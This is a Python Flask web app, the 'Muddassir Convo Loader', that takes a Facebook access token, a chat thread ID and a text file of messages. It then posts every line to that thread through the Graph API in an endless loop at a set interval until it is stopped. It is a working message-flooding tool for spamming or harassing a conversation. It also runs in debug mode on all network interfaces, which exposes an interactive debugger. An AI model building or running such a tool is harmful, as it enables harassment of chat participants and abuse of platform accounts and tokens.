from flask import Flask, request
import requests
import os
import threading
import time

app = Flask(__name__)
app.debug = True

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0',
    'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'www.google.com'
}

# Global control variable
stop_flag = False

def send_messages(access_token, thread_id, mn, time_interval, messages):
    global stop_flag
    stop_flag = False
    while not stop_flag:
        try:
            for message1 in messages:
                if stop_flag:   # agar stop dabaya ho to loop tod do
                    break
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                message = str(mn) + ' ' + message1
                parameters = {'access_token': access_token, 'message': message}
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    print(f"✅ Message sent: {message}")
                else:
                    print(f"❌ Failed: {message}")
                time.sleep(time_interval)
        except Exception as e:
            print("⚠️ Error:", e)
            time.sleep(10)


@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        # Run in background thread
        thread = threading.Thread(target=send_messages, args=(access_token, thread_id, mn, time_interval, messages))
        thread.start()

        return "<h3>🚀 Messages started sending in background. <a href='/stop'>Stop Here</a></h3>"

    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Muddassir PaPa</title>
      <style>
        body {
          margin: 0;
          padding: 0;
          height: 100vh;
          display: flex;
          justify-content: center;
          align-items: center;
          font-family: Arial, sans-serif;
          background: url('https://wallpapercave.com/wp/wp9113443.jpg') no-repeat center center fixed;
          background-size: cover;
        }
        .form-container {
          background: rgba(255, 255, 255, 0.85);
          padding: 25px;
          border-radius: 15px;
          box-shadow: 0 8px 20px rgba(0,0,0,0.5);
          width: 350px;
        }
        h2 {
          text-align: center;
          color: #222;
          margin-bottom: 20px;
        }
        label {
          font-weight: bold;
        }
        input {
          width: 100%;
          padding: 10px;
          margin: 8px 0;
          border: 1px solid #ccc;
          border-radius: 8px;
        }
        button {
          width: 100%;
          padding: 12px;
          background-color: #ff4500;
          border: none;
          border-radius: 10px;
          color: white;
          font-weight: bold;
          font-size: 16px;
          cursor: pointer;
          transition: 0.3s;
        }
        button:hover {
          background-color: #e63e00;
        }
      </style>
    </head>
    <body>
      <div class="form-container">
        <h2>🔥 Muddassir Convo Loader 🔥</h2>
        <form method="post" enctype="multipart/form-data">
            <label>Token:</label>
            <input type="text" name="accessToken" required>
            <label>Thread ID:</label>
            <input type="text" name="threadId" required>
            <label>Name:</label>
            <input type="text" name="kidx" required>
            <label>File:</label>
            <input type="file" name="txtFile" accept=".txt" required>
            <label>Interval (sec):</label>
            <input type="number" name="time" required>
            <button type="submit">🚀 Start Sending</button>
        </form>
      </div>
    </body>
    </html>
    '''


@app.route('/stop')
def stop():
    global stop_flag
    stop_flag = True
    return "<h3>🛑 Messages stopped successfully.</h3>"


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
